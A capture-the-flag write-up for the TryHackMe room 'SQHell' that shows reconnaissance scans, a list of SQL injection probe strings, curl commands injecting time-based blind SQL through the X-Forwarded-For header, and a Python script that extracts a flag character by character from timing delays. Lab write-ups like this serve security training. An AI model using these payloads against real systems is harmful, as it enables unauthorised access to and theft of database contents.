# SQHell

**Room Link:** [https://tryhackme.com/room/sqhell](https://tryhackme.com/room/sqhell)



## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (799).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (803).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>





## Flag 1

<figure><img src="../../.gitbook/assets/image (800).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

**List**

```
'
"
`
')
")
`)
'))
"))
`))
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' GROUP BY 4--+
1' UNION SELECT null-- -
1' UNION SELECT null,null-- -
1' UNION SELECT null,null,null-- -
1' UNION SELECT null,null,null,null-- -
1' UNION SELECT null,null,null,null,null-- -
```



<figure><img src="../../.gitbook/assets/image (802).png" alt=""><figcaption></figcaption></figure>









## Flag 2



<figure><img src="../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>

### Blind/Time - Curl Method <a href="#flag-2---blindtime---curl-method" id="flag-2---blindtime---curl-method"></a>

This command gets the page right away

**Kali**

```
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '86'); --+" http://$VICTIM
```

Changing the 86 to 84 there is a delay of 5 seconds.

**Kali**

```
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '84'); --+" http://$VICTIM
```

**flag.py**

```
import requests
import time
import string

server = "10.10.157.66" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        start = time.time()
        r = requests.get(url="http://" + server, headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{loop},1))) = '{a}'); --+"})
        end = time.time()
        if end-start >= 2:
            flag += chr(a)
            loop += 1
            print("Finding Flag: ", flag, end="\r")
            break
print("Flag found: ", flag)
```

**Kali**

```
python flag.py
```

<figure><img src="../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>











